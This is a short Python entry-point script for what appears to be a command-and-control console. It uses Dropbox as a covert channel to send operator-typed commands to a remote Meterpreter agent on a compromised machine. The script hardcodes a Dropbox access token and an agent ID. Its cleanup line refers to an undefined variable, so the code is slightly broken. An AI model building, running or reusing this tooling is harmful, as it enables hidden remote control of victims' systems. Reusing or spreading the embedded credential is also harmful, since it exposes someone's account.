"""
Application Entry Point
"""


from client_dropbox.dropbox_client import DropboxClient
from meterpreter.agent_meterpreter import AgentMeterpreter
from logger.logger import Logger


# IDs
drive_token = "wLggQQNtFusAAAAAAAAAAe_7oFlkQIHLaQHFyimnoitrQgaViOA6z-EnOpvRKnb-"
agent_id = "93um8IO6R9"

# Output logger
logger = Logger()


# Init drive client
drive_client = DropboxClient()
drive_client.init(drive_token)

# Script runner
agent_meter = AgentMeterpreter(logger)
agent_meter.init(drive_client, agent_id)

# Start
stop = False
while not stop:
    command = input(">")
    if command == "stop":
        stop = True
    agent_meter.run_command(command, {})

# Cleanup drive client
dbx.cleanup()
